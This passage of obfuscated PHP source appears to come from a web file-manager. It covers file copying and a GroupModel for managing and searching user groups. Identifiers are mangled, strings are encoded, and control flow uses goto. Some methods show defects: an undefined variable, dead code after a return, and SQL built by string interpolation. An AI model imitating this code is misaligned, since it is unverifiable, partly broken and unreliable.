$ÒĞ…û¶İ[$†•ûÈú[$ùÔÀŸ˜Ñ[32]]]; } $†•ûÈú[$ùÔÀŸ˜Ñ[468]] = $†•ûÈú[$ùÔÀŸ˜Ñ[33]] == $ùÔÀŸ˜Ñ[88]; $†•ûÈú[$ùÔÀŸ˜Ñ[469]] = substr(_get($†•ûÈú, $ùÔÀŸ˜Ñ[188], $ùÔÀŸ˜Ñ[12]), 0, 10); $†•ûÈú[$ùÔÀŸ˜Ñ[89]] = _get($†•ûÈú, $ùÔÀŸ˜Ñ[89], 0); $†•ûÈú[$ùÔÀŸ˜Ñ[524]] = _get($†•ûÈú, $ùÔÀŸ˜Ñ[524], 0); if (!isset($†•ûÈú[$ùÔÀŸ˜Ñ[653]]) && $†•ûÈú[$ùÔÀŸ˜Ñ[524]]) { $±à¥•–[$ùÔÀŸ˜Ñ[650]][] = $†•ûÈú[$ùÔÀŸ˜Ñ[524]]; } if ($‡ıÛ­’Î) { $ôÁô½ò = $this->fileNameExistCache($ûŸè°µ, $†•ûÈú[$ùÔÀŸ˜Ñ[32]]); if ($ôÁô½ò) { if ($†•ûÈú[$ùÔÀŸ˜Ñ[468]] || $‡ıÛ­’Î == REPEAT_SKIP) { continue; } if ($‡ıÛ­’Î == REPEAT_REPLACE) { $óÚìïº˜ = $this->sourceInfoCache($ôÁô½ò); $¼ã·³ŠÓ = $this->fileHistory($óÚìïº˜, $†•ûÈú[$ùÔÀŸ˜Ñ[524]], $†•ûÈú[$ùÔÀŸ˜Ñ[89]]); if ($¼ã·³ŠÓ) { $±à¥•–[$ùÔÀŸ˜Ñ[612]][] = $†•ûÈú[$ùÔÀŸ˜Ñ[524]]; } continue; } else { if ($‡ıÛ­’Î == REPEAT_RENAME) { $†•ûÈú[$ùÔÀŸ˜Ñ[32]] = $this->fileNameAutoCache($ûŸè°µ, $†•ûÈú[$ùÔÀŸ˜Ñ[32]], $‡ıÛ­’Î, !1); } } } } if (!$†•ûÈú[$ùÔÀŸ˜Ñ[468]] && $†•ûÈú[$ùÔÀŸ˜Ñ[524]] == 0) { continue; } if (!$†•ûÈú[$ùÔÀŸ˜Ñ[468]] && $†•ûÈú[$ùÔÀŸ˜Ñ[524]]) { $±à¥•–[$ùÔÀŸ˜Ñ[612]][] = $†•ûÈú[$ùÔÀŸ˜Ñ[524]]; } $õÊ¶ˆ÷§[] = $this->_makeItemData($†•ûÈú, $×âªÚÔÂ, $†•ûÈú[$ùÔÀŸ˜Ñ[32]]); } unset($†•ûÈú); if (!empty($õÊ¶ˆ÷§)) { $this->addAll($õÊ¶ˆ÷§); $this->_childrenListSelect($ûŸè°µ); } $¾Ìé¨§¦ = $this->_childrenList($ûŸè°µ); $¾Ìé¨§¦ = array_to_keyvalue($¾Ìé¨§¦, $ùÔÀŸ˜Ñ[32]); foreach ($¿ü£Ù‡¹ as $†•ûÈú) { $óÚìïº˜ = $¾Ìé¨§¦[$†•ûÈú[$ùÔÀŸ˜Ñ[32]]]; $„¡³ùö¢ = $óÚìïº˜[$ùÔÀŸ˜Ñ[194]]; $this->_copyApplyMeta($óÚìïº˜, $±à¥•–); if ($†•ûÈú[$ùÔÀŸ˜Ñ[33]] == $ùÔÀŸ˜Ñ[88]) { $†•ûÈú[$ùÔÀŸ˜Ñ[97]] = $ı£ŠøÈ->getPathInner($†•ûÈú[$ùÔÀŸ˜Ñ[97]]); $this->_copyChildTo($ı£ŠøÈ, $†•ûÈú[$ùÔÀŸ˜Ñ[97]], $„¡³ùö¢, $‡ıÛ­’Î, $±à¥•–, $Õ³ÊÎÏ«); } } } private function _addFiles($½å¸ƒÜé, $ƒã¡Ö±á, $ÑÔ–êõ) { $Ü¯å‚ø =& $_SERVER[Ñ¯©ç]; if (!$ƒã¡Ö±á || count($ƒã¡Ö±á) == 0) { return array(); } $é¥„Ê´² = array(); foreach ($ƒã¡Ö±á as &$¿ª©Øâí) { Hook::trigger($Ü¯å‚ø[654], $¿ª©Øâí); $¿ª©Øâí[$Ü¯å‚ø[97]] = $½å¸ƒÜé->getPathInner($¿ª©Øâí[$Ü¯å‚ø[97]]); $©úÅËÛÌ = $½å¸ƒÜé->hashSimple($¿ª©Øâí[$Ü¯å‚ø[97]]); $ú¥²ç÷õ = $½å¸ƒÜé->hashMd5($¿ª©Øâí[$Ü¯å‚ø[97]]); if (strlen($ú¥²ç÷õ) > 10 && !isset($é¥„Ê´²[$ú¥²ç÷õ])) { $é¥„Ê´²[$ú¥²ç÷õ] = array(); } $¿ª©Øâí[$Ü¯å‚ø[655]] = $©úÅËÛÌ; $¿ª©Øâí[$Ü¯å‚ø[530]] = $ú¥²ç÷õ; $é¥„Ê´²[$ú¥²ç÷õ][] =& $¿ª©Øâí; if (count($é¥„Ê´²[$ú¥²ç÷õ]) > 1) { $¿ª©Øâí[$Ü¯å‚ø[653]] = !0; } Hook::trigger($Ü¯å‚ø[656], $¿ª©Øâí); } unset($¿ª©Øâí); $â¢‚½Ñ“ = array($Ü¯å‚ø[530] => array($Ü¯å‚ø[7], array_keys($é¥„Ê´²))); $³ñ˜¤½ = Model($Ü¯å‚ø[657]); $ä‚îô = $³ñ˜¤½->where($â¢‚½Ñ“)->select(); $ä‚îô = $ä‚îô ? $ä‚îô : array(); foreach ($ä‚îô as $òÓâù÷) { if (!isset($é¥„Ê´²[$òÓâù÷[$Ü¯å‚ø[530]]])) { continue; } $™ğÇêØ = $é¥„Ê´²[$òÓâù÷[$Ü¯å‚ø[530]]]; foreach ($™ğÇêØ as &$¿ª©Øâí) { $¿ª©Øâí[$Ü¯å‚ø[524]] = $òÓâù÷[$Ü¯å‚ø[524]]; $¿ª©Øâí[$Ü¯å‚ø[653]] = !0; } unset($¿ª©Øâí); } $¨âşî›ê = array(); foreach ($ƒã¡Ö±á as $ßŸÓûã®) { Hook::trigger($Ü¯å‚ø[658], $ßŸÓûã®); if (isset($ßŸÓûã®[$Ü¯å‚ø[653]]) && $ßŸÓûã®[$Ü¯å‚ø[653]]) { Hook::trigger($Ü¯å‚ø[659], $ßŸÓûã®); continue; } $Š±¯êæ¤ = $½å¸ƒÜé->getPathInner($ßŸÓûã®[$Ü¯å‚ø[97]]); $ÚËã©‡» = $³ñ˜¤½->addFileMake($Š±¯êæ¤, $ßŸÓûã®[$Ü¯å‚ø[89]], $ßŸÓûã®[$Ü¯å‚ø[655]], $ßŸÓûã®[$Ü¯å‚ø[530]], $ßŸÓûã®[$Ü¯å‚ø[32]], $ÑÔ–êõ); Hook::trigger($Ü¯å‚ø[659], $ßŸÓûã®); if (!is_array($ÚËã©‡»)) { continue; } $¨âşî›ê[] = $ÚËã©‡»; } $³ñ˜¤½->addAll($¨âşî›ê); $â¢‚½Ñ“ = array($Ü¯å‚ø[530] => array($Ü¯å‚ø[7], array_keys($é¥„Ê´²))); $ä‚îô = $³ñ˜¤½->where($â¢‚½Ñ“)->select(); $ä‚îô = $ä‚îô ? $ä‚îô : array(); foreach ($ä‚îô as $òÓâù÷) { if (!isset($é¥„Ê´²[$òÓâù÷[$Ü¯å‚ø[530]]])) { continue; } $Ì­¬©ã =& $é¥„Ê´²[$òÓâù÷[$Ü¯å‚ø[530]]]; foreach ($Ì­¬©ã as &$¿ª©Øâí) { $¿ª©Øâí[$Ü¯å‚ø[524]] = $òÓâù÷[$Ü¯å‚ø[524]]; } unset($¿ª©Øâí); } $Œ÷È…¨ñ = array(); foreach ($ƒã¡Ö±á as $ø·Éå) { $Œ÷È…¨ñ[$ø·Éå[$Ü¯å‚ø[32]]] = $ø·Éå; } return $Œ÷È…¨ñ; } } define($_SERVER[Ñ¯©ç][660], $_SERVER[Ñ¯©ç][661]); $zhvekjymqd = $_SERVER[Ñ¯©ç][662]; goto FĞŞ§ñ§‹Ê; C¸³—³‚¨ã: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\x6d\x65" => "\x67\x72\x6f\x75\x70\x5f\x6d\x65\x74\141", "\155\145\x74\x61\106\151\145\x6c\144" => "\147\162\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($ıÖŞ¤ì) { $€šÙ²šÜ =& $_SERVER[Ñ¯©ç]; return array($€šÙ²šÜ[2034] => array($ıÖŞ¤ì[0], $€šÙ²šÜ[2035]), $€šÙ²šÜ[2036] => array($ıÖŞ¤ì[0], $€šÙ²šÜ[2037])); } protected function getInfo($ñŒñ¹ä, $çğÀÁß« = false) { $ìı±¸±ü = $this->getInfoSimple($ñŒñ¹ä); if (!$ìı±¸±ü) { return !1; } if ($çğÀÁß«) { return $this->_listDataApplyItem($ìı±¸±ü); } return $this->cacheFunctionGet($_SERVER[Ñ¯©ç][2038], $ñŒñ¹ä); } protected function getInfoSimple($€œ”ÇÀ, $Ö²Âù¨ = false) { $½½¸…Ã =& $_SERVER[Ñ¯©ç]; if ($Ö²Âù¨) { $¦ä°˜ì = array($½½¸…Ã[1955] => intval($€œ”ÇÀ)); $½¾ËãÙ¤ = $this->where($¦ä°˜ì)->find(); return is_array($½¾ËãÙ¤) ? $½¾ËãÙ¤ : array(); } return $this->cacheFunctionGet($½½¸…Ã[2039], $€œ”ÇÀ); } protected function groupAdd($óÂÁšù„) { $îßü¸©ò =& $_SERVER[Ñ¯©ç]; if (!$óÂÁšù„[$îßü¸©ò[193]] && isset($óÂÁšù„[$îßü¸©ò[1955]]) && $óÂÁšù„[$îßü¸©ò[1955]] == 1) { if ($€Ãöş‡ = $this->getInfoSimple($óÂÁšù„[$îßü¸©ò[1955]], !0)) { return $óÂÁšù„[$îßü¸©ò[1955]]; } } else { $€Ãöş‡ = $this->getInfoSimple($óÂÁšù„[$îßü¸©ò[193]]); if (!$€Ãöş‡) { return !1; } } $Ø“ö°é = $îßü¸©ò[578]; if ($€Ãöş‡[$îßü¸©ò[568]]) { $Ø“ö°é = $€Ãöş‡[$îßü¸©ò[568]] . $€Ãöş‡[$îßü¸©ò[1955]] . $îßü¸©ò[50]; } $›€„ÃÄ = array($îßü¸©ò[477] => $this->groupNameAuto($óÂÁšù„[$îßü¸©ò[193]], $óÂÁšù„[$îßü¸©ò[32]]), $îßü¸©ò[460] => $óÂÁšù„[$îßü¸©ò[193]], $îßü¸©ò[635] => $Ø“ö°é, $îßü¸©ò[2040] => $óÂÁšù„[$îßü¸©ò[1942]], $îßü¸©ò[2041] => 0, $îßü¸©ò[1959] => 0); if (isset($óÂÁšù„[$îßü¸©ò[1979]])) { $›€„ÃÄ[$îßü¸©ò[1979]] = $óÂÁšù„[$îßü¸©ò[1979]]; } else { $Ï€¶ûÚ« = $this->max($îßü¸©ò[1979]); if (!$Ï€¶ûÚ«) { $Ï€¶ûÚ« = 0; } $›€„ÃÄ[$îßü¸©ò[1979]] = $Ï€¶ûÚ« + 1; } if (!empty($óÂÁšù„[$îßü¸©ò[1955]])) { $›€„ÃÄ[$îßü¸©ò[1955]] = $óÂÁšù„[$îßü¸©ò[1955]]; } $ÈäâÃå© = $this->add($›€„ÃÄ); $this->setNamePinyin($ÈäâÃå©, $›€„ÃÄ[$îßü¸©ò[32]]); if (isset($óÂÁšù„[$îßü¸©ò[2042]])) { $this->metaSet($ÈäâÃå©, array($îßü¸©ò[2042] => $óÂÁšù„[$îßü¸©ò[2042]], $îßü¸©ò[2043] => $óÂÁšù„[$îßü¸©ò[2043]])); unset($óÂÁšù„[$îßü¸©ò[2042]]); unset($óÂÁšù„[$îßü¸©ò[2043]]); } Model($îßü¸©ò[1391])->groupRootAdd($ÈäâÃå©); $this->_clearCache($óÂÁšù„[$îßü¸©ò[193]]); return $ÈäâÃå©; } protected function groupEdit($Ôç—Üòã, $ÖĞßôÇÇ) { $½¤£­û =& $_SERVER[Ñ¯©ç]; $Îî†ÌÃ§ = $this->getInfoSimple($Ôç—Üòã); if (!$Îî†ÌÃ§) { return !1; } if (!empty($ÖĞßôÇÇ[$½¤£­û[193]])) { $ÜÛš‘©Ì = $this->getInfoSimple($ÖĞßôÇÇ[$½¤£­û[193]]); if (!$ÜÛš‘©Ì) { return !1; } if ($Îî†ÌÃ§[$½¤£­û[1955]] == $ÜÛš‘©Ì[$½¤£­û[1955]]) { return !1; } if ($ÖĞßôÇÇ[$½¤£­û[193]] != $Îî†ÌÃ§[$½¤£­û[193]]) { if ($ÜÛš‘©Ì[$½¤£­û[568]] !== $Îî†ÌÃ§[$½¤£­û[568]] && strpos($ÜÛš‘©Ì[$½¤£­û[568]], $Îî†ÌÃ§[$½¤£­û[568]] . $Îî†ÌÃ§[$½¤£­û[1955]] . $½¤£­û[50]) === 0) { return !1; } $ÖĞßôÇÇ[$½¤£­û[635]] = $ÜÛš‘©Ì[$½¤£­û[568]] . $ÖĞßôÇÇ[$½¤£­û[193]] . $½¤£­û[50]; $this->_changeChildLevel($Îî†ÌÃ§, $ÜÛš‘©Ì); $this->_clearCache($ÜÛš‘©Ì[$½¤£­û[1955]]); $this->_clearCache($Îî†ÌÃ§[$½¤£­û[193]]); } } if (isset($ÖĞßôÇÇ[$½¤£­û[32]])) { $this->setNamePinyin($Ôç—Üòã, $ÖĞßôÇÇ[$½¤£­û[32]]); } if (isset($ÖĞßôÇÇ[$½¤£­û[2042]])) { $this->metaSet($Ôç—Üòã, array($½¤£­û[2042] => $ÖĞßôÇÇ[$½¤£­û[2042]], $½¤£­û[2043] => $ÖĞßôÇÇ[$½¤£­û[2043]])); unset($ÖĞßôÇÇ[$½¤£­û[2042]]); unset($ÖĞßôÇÇ[$½¤£­û[2043]]); } $this->_clearChildrenCache($Îî†ÌÃ§); return $this->where(array($½¤£­û[2044] => $Ôç—Üòã))->save($ÖĞßôÇÇ); } private function _clearChildrenCache($Øûåòº ) { $‡»ı¡ÎÅ =& $_SERVER[Ñ¯©ç]; $êûæâ = array($‡»ı¡ÎÅ[635] => array($‡»ı¡ÎÅ[595], $Øûåòº [$‡»ı¡ÎÅ[568]] . $Øûåòº [$‡»ı¡ÎÅ[1955]] . $‡»ı¡ÎÅ[596])); $œ¿»ŒúŒ = $this->field($‡»ı¡ÎÅ[1955])->where($êûæâ)->select(); foreach ($œ¿»ŒúŒ as $ü½ñöµ) { $this->_clearCache($ü½ñöµ[$‡»ı¡ÎÅ[1955]]); } } private function _clearCache($ƒ÷Ùôå…) { $ˆÀú¶øÚ =& $_SERVER[Ñ¯©ç]; $this->cacheFunctionClear($ˆÀú¶øÚ[2038], $ƒ÷Ùôå…); $this->cacheFunctionClear($ˆÀú¶øÚ[2039], $ƒ÷Ùôå…); } private function _changeChildLevel($¥Ñ½îî, $ØÚ¹ÆÀé, $¿—«æÈØ = false) { $¥ğ¦öÙø =& $_SERVER[Ñ¯©ç]; $©‹ÛŒ§’ = $¥Ñ½îî[$¥ğ¦öÙø[568]] . $¥Ñ½îî[$¥ğ¦öÙø[1955]] . $¥ğ¦öÙø[50]; $‚Ù‰µÛÄ = $ØÚ¹ÆÀé[$¥ğ¦öÙø[568]] . $ØÚ¹ÆÀé[$¥ğ¦öÙø[1955]] . $¥ğ¦öÙø[50] . $¥Ñ½îî[$¥ğ¦öÙø[1955]] . $¥ğ¦öÙø[50]; if ($¿—«æÈØ) { $‚Ù‰µÛÄ = $ØÚ¹ÆÀé[$¥ğ¦öÙø[568]] . $ØÚ¹ÆÀé[$¥ğ¦öÙø[1955]] . $¥ğ¦öÙø[50]; } $çëÈİØ¼ = array($¥ğ¦öÙø[635] => array($¥ğ¦öÙø[595], $¥Ñ½îî[$¥ğ¦öÙø[568]] . $¥Ñ½îî[$¥ğ¦öÙø[1955]] . $¥ğ¦öÙø[596])); $¨µªâŒ = array($¥ğ¦öÙø[635] => array($¥ğ¦öÙø[644], "\162\x65\160\x6c\141\x63\145\x28\x70\x61\x72\x65\x6e\164\114\145\x76\x65\x6c\x2c\47{$©‹ÛŒ§’}\47\x2c\x27{$‚Ù‰µÛÄ}\47\x29")); $this->_clearChildrenCache($¥Ñ½îî); $this->where($çëÈİØ¼)->data($¨µªâŒ)->save(); } public function setNamePinyin($ı†¾ò†, $ÒŞÁÓı­ = false) { $×çôª˜° =& $_SERVER[Ñ¯©ç]; if (!$ÒŞÁÓı­) { $ßĞìŸ¿Ô = $this->getInfoSimple($ı†¾ò†); $ÒŞÁÓı­ = $ßĞìŸ¿Ô[$×çôª˜°[32]]; } if (!Input::check($ÒŞÁÓı­, $×çôª˜°[638])) { $this->metaSet($ı†¾ò†, $×çôª˜°[521], null); $this->metaSet($ı†¾ò†, $×çôª˜°[520], null); return; } $áğÖ‰ü = array($×çôª˜°[521] => str_replace($×çôª˜°[53], $×çôª˜°[12], Pinyin::get($ÒŞÁÓı­)), $×çôª˜°[520] => Pinyin::get($ÒŞÁÓı­, $×çôª˜°[639])); $this->metaSet($ı†¾ò†, $áğÖ‰ü); } protected function groupStatus($¤ÇÈé£, $à§Ö† ı) { $Ó”áˆÖ =& $_SERVER[Ñ¯©ç]; $âıŠÎ‰è = $this->getInfoSimple($¤ÇÈé£); if (!$âıŠÎ‰è) { return !1; } $this->_clearCache($¤ÇÈé£); return $this->metaSet($¤ÇÈé£, $Ó”áˆÖ[803], $à§Ö† ı); if ($à§Ö† ı == $Ó”áˆÖ[101]) { $‰¡÷ô§« = $this->parentLevelArray($âıŠÎ‰è[$Ó”áˆÖ[568]]); } else { } $‰¡÷ô§«[] = $âıŠÎ‰è[$Ó”áˆÖ[1955]]; $šÂå§ = array(); foreach ($‰¡÷ô§« as $¤ÇÈé£) { $šÂå§[] = array($Ó”áˆÖ[1955] => $¤ÇÈé£, $Ó”áˆÖ[107] => $Ó”áˆÖ[803], $Ó”áˆÖ[434] => $à§Ö† ı); $this->_clearCache($¤ÇÈé£); } return Model($Ó”áˆÖ[2045])->addAll($šÂå§, array(), !0); } protected function groupRemove($ÔûÆáËŞ, $ŒÅû¾„ = false) { $ËÔàı­¤ =& $_SERVER[Ñ¯©ç]; $ÙÕãèì‡ = array($ËÔàı­¤[1955] => $ÔûÆáËŞ); $Ø˜ò‰«Ó = $this->where($ÙÕãèì‡)->find(); if (!$Ø˜ò‰«Ó || $Ø˜ò‰«Ó[$ËÔàı­¤[193]] == 0) { return !1; } if (!$ŒÅû¾„) { $ª¬Ã”· = $this->getInfoSimple($Ø˜ò‰«Ó[$ËÔàı­¤[193]]); $this->_changeChildLevel($Ø˜ò‰«Ó, $ª¬Ã”·, !0); $this->where(array($ËÔàı­¤[193] => $ÔûÆáËŞ))->save(array($ËÔàı­¤[193] => $Ø˜ò‰«Ó[$ËÔàı­¤[193]])); $this->_clearCache($ª¬Ã”·[$ËÔàı­¤[1955]]); } Model($ËÔàı­¤[2045])->where($ÙÕãèì‡)->delete(); Model($ËÔàı­¤[2046])->where($ÙÕãèì‡)->delete(); Model($ËÔàı­¤[877])->groupRootRemove($ÔûÆáËŞ); $this->_clearCache($Ø˜ò‰«Ó[$ËÔàı­¤[193]]); return $this->where($ÙÕãèì‡)->delete(); } protected function groupSort($ÇÙ£İ£) { $¤ò¶å™¨ =& $_SERVER[Ñ¯©ç]; $éí…ô–™ = array(); foreach ($ÇÙ£İ£ as $ª‰€ßû½ => $ÅÅ ¨ù±) { $éí…ô–™[] = array($¤ò¶å™¨[1955], $ÅÅ ¨ù±, $¤ò¶å™¨[1979], $ª‰€ßû½ + 1); } $this->saveAll($éí…ô–™); } public function listData() { $é‰û®Ó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($é‰û®Ó[$_SERVER[Ñ¯©ç][429]]); return $é‰û®Ó; } private function _makeOrder($ª•‘ÊÈ = '') { $çñÖ…· =& $_SERVER[Ñ¯©ç]; $³ºßŸÇ = array($çñÖ…·[1955], $çñÖ…·[32], $çñÖ…·[1944], $çñÖ…·[232]); $ÓÙËâ¡„ = array($çñÖ…·[506] => $çñÖ…·[507], $çñÖ…·[508] => $çñÖ…·[509]); $µ©•‡ïà = Input::get($çñÖ…·[513], $çñÖ…·[7], $çñÖ…·[1959], $³ºßŸÇ); $½òÁ¯¡µ = Input::get($çñÖ…·[514], $çñÖ…·[7], $çñÖ…·[2047], array($çñÖ…·[2047], $çñÖ…·[508])); $½òÁ¯¡µ = $ÓÙËâ¡„[$½òÁ¯¡µ]; $ª•‘ÊÈ = $ª•‘ÊÈ . "{$µ©•‡ïà}\40{$½òÁ¯¡µ}\x2c\x20\x67\x72\157\x75\160\x49\104\x20\x61\163\x63"; return $this->order($ª•‘ÊÈ); } public function listChild($œĞ›Òé) { $«”®ú˜ =& $_SERVER[Ñ¯©ç]; $ª •§ÂÄ = $this->where(array($«”®ú˜[193] => $œĞ›Òé))->_makeOrder()->selectPage(200); $this->_listDataApply($ª •§ÂÄ[$«”®ú˜[429]]); return $ª •§ÂÄ; } public function listChildIds($ØâùÇÙ“) { $Ù Ÿ°ÅÅ =& $_SERVER[Ñ¯©ç]; if (is_string($§ë½•˜É)) { $ØâùÇÙ“ = explode($Ù Ÿ°ÅÅ[50], $ØâùÇÙ“); } $¬¸Ìî‰† = $this->where(array($Ù Ÿ°ÅÅ[1955] => array($Ù Ÿ°ÅÅ[7], $ØâùÇÙ“)))->field($Ù Ÿ°ÅÅ[2048])->select(); if (!$¬¸Ìî‰†) { return !1; } $Ï½£¾Òœ = array(); foreach ($¬¸Ìî‰† as $¬¸Æ²ğš) { $Ï½£¾Òœ[] = "\163\x65\154\145\x63\x74\x20\x67\162\x6f\165\160\111\x44\x20\x66\162\157\155\40\140\147\x72\x6f\x75\x70\x60\40\x77\150\x65\162\x65\x20\x70\141\x72\145\x6e\x74\114\x65\166\145\x6c\40\x6c\x69\x6b\x65\40\47{$¬¸Æ²ğš[$Ù Ÿ°ÅÅ[568]]}{$¬¸Æ²ğš[$Ù Ÿ°ÅÅ[1955]]}\54\x25\47"; } $Ï½£¾Òœ = implode($Ù Ÿ°ÅÅ[2049], $Ï½£¾Òœ); $¬¸Ìî‰† = $this->query($Ï½£¾Òœ); if (!$¬¸Ìî‰†) { return array(); } $ØâùÇÙ“ = array_to_keyvalue($¬¸Ìî‰†, $Ù Ÿ°ÅÅ[12], $Ù Ÿ°ÅÅ[1955]); return array_unique($ØâùÇÙ“); } public function listByID($ååŒëò) { $¨ƒ’ºàÑ =& $_SERVER[Ñ¯©ç]; if (!$ååŒëò) { return array(); } $«ûşßøô = array($¨ƒ’ºàÑ[1955] => array($¨ƒ’ºàÑ[7], $ååŒëò)); $‰®‰µ• = $this->where($«ûşßøô)->select(); $‰®‰µ• = array_sort_keep($‰®‰µ•, $¨ƒ’ºàÑ[1955], $ååŒëò); $this->_listDataApply($‰®‰µ•); return $‰®‰µ•; } public function listSearch($´Ò¿Ã­î) { $øƒÃœ‡ =& $_SERVER[Ñ¯©ç]; $›í Şï = trim($´Ò¿Ã­î[$øƒÃœ‡[2050]]); $ÂĞÂìÄÇ = explode($øƒÃœ‡[53], $›í Şï); if (!$›í Şï || count($ÂĞÂìÄÇ) == 1) { return $this->listSearchNow($´Ò¿Ã­î); } $á«É‹Œ´ = array($øƒÃœ‡[429] => array()); foreach ($ÂĞÂìÄÇ as $â…Œ£Ó…) { if (!trim($â…Œ£Ó…)) { continue; } $´Ò¿Ã­î[$øƒÃœ‡[2050]] = $â…Œ£Ó…; $Ú¹ÕîíÜ = $this->listSearchNow($´Ò¿Ã­î); $á«É‹Œ´[$øƒÃœ‡[429]] = array_merge($á«É‹Œ´[$øƒÃœ‡[429]], $Ú¹ÕîíÜ[$øƒÃœ‡[429]]); } $á«É‹Œ´[$øƒÃœ‡[429]] = array_unique_by_key($á«É‹Œ´[$øƒÃœ‡[429]], $øƒÃœ‡[1955]); $á«É‹Œ´[$øƒÃœ‡[426]] = array($øƒÃœ‡[427] => count($á«É‹Œ´[$øƒÃœ‡[429]]), $øƒÃœ‡[423] => 20, $øƒÃœ‡[413] => 1, $øƒÃœ‡[428] => 1); return $á«É‹Œ´; } public function listSearchNow($ã±¶˜±Ù) { $—´€ÎõÃ =& $_SERVER[Ñ¯©ç]; $¼øİï¿ = trim($ã±¶˜±Ù[$—´€ÎõÃ[2050]]); $¶ë¬û·· = isset($ã±¶˜±Ù[$—´€ÎõÃ[2051]]) ? $ã±¶˜±Ù[$—´€ÎõÃ[2051]] : !1; if (!trim($¼øİï¿)) { return !1; } $¼øİï¿ = str_replace($—´€ÎõÃ[2052], $—´€ÎõÃ[2053], $¼øİï¿); $®£óêÚš = array($—´€ÎõÃ[1955] => array($—´€ÎõÃ[442], "{$¼øİï¿}\x25"), $—´€ÎõÃ[32] => array($—´€ÎõÃ[442], "\45{$¼øİï¿}\45"), $—´€ÎõÃ[1053] => $—´€ÎõÃ[2054]); if ($¶ë¬û··) { $œŒƒîóŞ = $this->getInfoSimple($¶ë¬û··); $ß±”²³É = $œŒƒîóŞ[$—´€ÎõÃ[568]] . $¶ë¬û·· . $—´€ÎõÃ[596]; $®£óêÚš = array($®£óêÚš, array($—´€ÎõÃ[568] => array($—´€ÎõÃ[442], $ß±”²³É))); } $®£óêÚš = $this->parseWhereLike($®£óêÚš); $ŞëéÌËì = $this->_makeOrder()->where($®£óêÚš)->selectPage(20); $ŞëéÌËì = $ŞëéÌËì ? $ŞëéÌËì : array($—´€ÎõÃ[429] => array(), $—´€ÎõÃ[426] => array()); if (!$ŞëéÌËì || count($ŞëéÌËì[$—´€ÎõÃ[429]]) < 5 && Input::check($¼øİï¿, $—´€ÎõÃ[378])) { $…êÕÀ´Ş = $this->groupChildrenAll($¶ë¬û··); $Ø¡ç™Œ = $this->_searchFromMeta($—´€ÎõÃ[520], $¼øİï¿, 10, $…êÕÀ´Ş); $ç×—ë„ê = $this->_searchFromMeta($—´€ÎõÃ[521], $¼øİï¿, 10, $…êÕÀ´Ş); $ ¿ô±ªê = array_merge($Ø¡ç™Œ, $ç×—ë„ê, $ŞëéÌËì[$—´€ÎõÃ[429]]); $ŞëéÌËì[$—´€ÎõÃ[429]] = array_unique_by_key($ ¿ô±ªê, $—´€ÎõÃ[1955]); $ŞëéÌËì[$—´€ÎõÃ[426]][$—´€ÎõÃ[427]] = count($ŞëéÌËì[$—´€ÎõÃ[429]]); $ŞëéÌËì[$—´€ÎõÃ[426]][$—´€ÎõÃ[428]] = ceil($ŞëéÌËì[$—´€ÎõÃ[426]][$—´€ÎõÃ[427]] / $ŞëéÌËì[$—´€ÎõÃ[426]][$—´€ÎõÃ[423]]); } $this->_listDataApply($ŞëéÌËì[$—´€ÎõÃ[429]]); return $ŞëéÌËì; } protected function groupChildrenAll($á‡Æ«Å) { $Ë×•„Æ‘ =& $_SERVER[Ñ¯©ç]; if (!$á‡Æ«Å) { return !1; } if (!is_array($á‡Æ«Å)) { $á‡Æ«Å = array($á‡Æ«Å); } $ù°›¼ó = $á‡Æ«Å; foreach ($á‡Æ«Å as $¡î™ŠùÌ) { $Ø¯£¬¹Š = $this->getInfoSimple($¡î™ŠùÌ); $¬‡í•ç× = array($Ë×•„Æ‘[568] => array($Ë×•„Æ‘[442], $Ø¯£¬¹Š[$Ë×•„Æ‘[568]] . $¡î™ŠùÌ . $Ë×•„Æ‘[596])); $ğóä°×ˆ = $this->field($Ë×•„Æ‘[1955])->where($¬‡í•ç×)->select(); $ù°›¼ó = array_merge($ù°›¼ó, array_to_keyvalue($ğóä°×ˆ, $Ë×•„Æ‘[12], $Ë×•„Æ‘[1955])); } return array_unique($ù°›¼ó); } private function _searchFromMeta($™š±«ßó, $Æ¿¢ÖÉÙ, $ÛªÀ…µÙ, $·şÒ£ú) { $í€­…ÃÆ =& $_SERVER[Ñ¯©ç]; $Æ¿¢ÖÉÙ = strtolower($Æ¿¢ÖÉÙ); $ì¿¯§”Ë = array($í€­…ÃÆ[107] => $™š±«ßó, $í€­…ÃÆ[434] => array($í€­…ÃÆ[442], "\45{$Æ¿¢ÖÉÙ}\x25")); $ì¿¯§”Ë = $this->parseWhereLike($ì¿¯§”Ë); if ($·şÒ£ú) { $ì¿¯§”Ë[$í€­…ÃÆ[1955]] = array($í€­…ÃÆ[7], $·şÒ£ú); } $–¯‘ü¯ï = Model($í€­…ÃÆ[2055])->where($ì¿¯§”Ë)->limit($ÛªÀ…µÙ)->select(); if (!$–¯‘ü¯ï) { return array(); } $–¯‘ü¯ï = array_to_keyvalue($–¯‘ü¯ï, $í€­…ÃÆ[12], $í€­…ÃÆ[1955]); $Ì¡Å²ß = $this->where(array($í€­…ÃÆ[2044] => array($í€­…ÃÆ[7], $–¯‘ü¯ï)))->select(); if (!$Ì¡Å²ß) { return array(); } return $Ì¡Å²ß; } protected function _listDataApplyItem($ß‰ÚÂ¼Â) { $Áå¸†¾¡ = array($ß‰ÚÂ¼Â); $this->_listDataApply($Áå¸†¾¡); return $Áå¸†¾¡[0]; } protected function _listDataApply(&$‡„šœ¸Ä) { $…‹´û ˜ =& $_SERVER[Ñ¯©ç]; if (!$‡„šœ¸Ä) { return; } $¯œßÒ”© = array_to_keyvalue($‡„šœ¸Ä, $…‹´û ˜[12], $…‹´û ˜[1955]); $this->_listAppendChildren($‡„šœ¸Ä); $this->_listAppendChildrenMember($‡„šœ¸Ä); $this->_listAppendMeta($‡„šœ¸Ä, $¯œßÒ”©); $this->_listAppendParent($‡„šœ¸Ä); $this->_listAppendSourceRoot($‡„šœ¸Ä, $¯œßÒ”©); } private function _listAppendChildren(&$’«ˆ§‡ñ) { $ôÅ˜¶ş¦ =& $_SERVER[Ñ¯©ç]; $ë±Â ÃÚ = array_to_keyvalue($’«ˆ§‡ñ, $ôÅ˜¶ş¦[12], $ôÅ˜¶ş¦[1955]); $â’Ş¶Ü = array($ôÅ˜¶ş¦[193] => array($ôÅ˜¶ş¦[7], $ë±Â ÃÚ)); $ûÆÖ = array($ôÅ˜¶ş¦[193], $ôÅ˜¶ş¦[2056] => $ôÅ˜¶ş¦[549]); 